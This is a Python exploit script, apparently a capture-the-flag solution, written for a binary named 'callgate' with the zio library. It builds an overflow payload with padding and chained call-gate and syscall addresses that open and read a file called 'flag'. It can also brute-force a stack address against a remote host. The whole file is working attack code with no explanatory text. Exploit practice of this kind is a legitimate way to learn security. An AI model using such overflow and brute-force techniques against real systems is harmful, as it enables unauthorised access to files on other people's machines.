#!/usr/bin/env python
# -*- coding: utf-8 -*-
from zio import *
import sys

def connect():
    io = zio(target, timeout=1000, print_read=False, print_write=False)
    return io

def guess(guess_address):
    padding = '#\x00' + 'A'*114
    enter_gate = 0x8048110
    read_cmd = 1
    read_fd = 0
    invoke_syscall = 0x7000000
    open_syscall = 5
    open_flag = 0 # read_only
    service_main = 0x80481BA

    OPEN_FILE = 'flag\x00'
    OPEN = l32(invoke_syscall) + l32(service_main) + l32(open_syscall) +\
            l32(guess_address - len(OPEN_FILE)) + l32(open_flag) + '\n'
    READ = l32(enter_gate) + l32(0) + l32(read_cmd) +\
            l32(read_fd) + l32(guess_address - len(OPEN_FILE)) +\
            l32(len(OPEN_FILE + OPEN)) + '\n'
    HELLO = '#hello\npassw0rd\n'

    io = connect()
    if not try_guess:
        io.gdb_hint()
    io.write(padding + READ + OPEN_FILE + OPEN + HELLO)
    ret = io.read(1024)
    return ret

try_guess = 0
if try_guess:
    target = ('10.211.55.56', 1413)
else:
    target = ('./callgate')

if try_guess:
    for address in range(0xffffe000, 0xffff0000, -1):
        print hex(address) + '\r',
        flag = guess(address)
        if flag != 'Please enter a filename: Attempting to open file...\nUnable to open file.\n':
            log('address: ' + hex(address), 'blue')
            log(flag, 'red')
            sys.exit(0)
    sys.exit(1)
else:
    final_address = 0xffffda30
    flag = guess(final_address)
    log(flag, 'red')
